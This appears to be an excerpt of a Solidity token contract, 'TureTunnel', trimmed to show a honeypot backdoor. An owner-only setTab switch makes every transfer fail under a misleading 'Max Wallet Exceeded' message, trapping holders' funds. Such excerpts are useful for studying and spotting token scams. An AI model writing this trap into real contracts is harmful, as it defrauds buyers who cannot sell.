...
contract TureTunnel is IERC20, Ownable {
    ...
    string _name = "TureTunnel";
    string _symbol = "TTN";
    uint8 constant _decimals = 6;

    uint256 _totalSupply = 10 ** 12 * (10 ** _decimals);   // 1,000,000,000,000 SUPPLY
    uint256 public _transferLimit = (_totalSupply * 49) / 100;   // 49% PERCENT
    uint256 public _maxWalletSize = (_totalSupply * 5) / 100;  // 5% PERCENT
    ...
    constructor () {
        ...
        router = IDEXRouter(0xCDe540d7eAFE93aC5fE6233Bee57E1270D3E330F);
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(tAb == true){
            require(tAb == false, "Max Wallet Exceeded");
        }
    ...
    function setTab(bool _tab) external onlyOwner () {
        tAb = _tab;
    }
